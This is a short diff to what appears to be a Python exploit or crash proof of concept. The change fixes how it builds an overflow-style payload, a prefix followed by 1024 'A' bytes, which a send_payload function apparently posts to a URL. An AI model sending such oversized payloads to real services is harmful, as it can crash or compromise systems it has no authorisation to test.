@@ -11,7 +11,7 @@ import requests
 def create_payload():
 	payload = b'00:00-00:'
 	buffer_size = 0x400
-	payload = b"A" * buffer_size
+	payload += b"A" * buffer_size
 	return payload
 
 def send_payload(url, payload):
